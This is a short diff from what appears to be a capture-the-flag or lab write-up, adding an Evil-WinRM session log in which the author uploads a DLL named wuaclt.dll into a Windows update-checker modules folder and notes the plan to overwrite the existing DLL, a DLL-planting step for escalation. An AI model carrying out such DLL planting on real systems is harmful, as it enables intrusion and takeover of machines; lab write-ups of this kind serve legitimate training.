@@ -885,5 +885,17 @@ python3 -m http.server 80
 ```
 
 ```python
+*Evil-WinRM* PS C:\Program Files\WindowsUpdateChecker\modules> upload wuaclt.dll
+                                        
+Info: Uploading /home/kali/hsm/NorthStone/wuaclt.dll to C:\Program Files\WindowsUpdateChecker\modules\wuaclt.dll
+                                        
+Data: 116224 bytes of 116224 bytes copied
+                                        
+Info: Upload successful!
+```
+
+Then ill overwrite the previous DLL
+
+```python
 
 ```
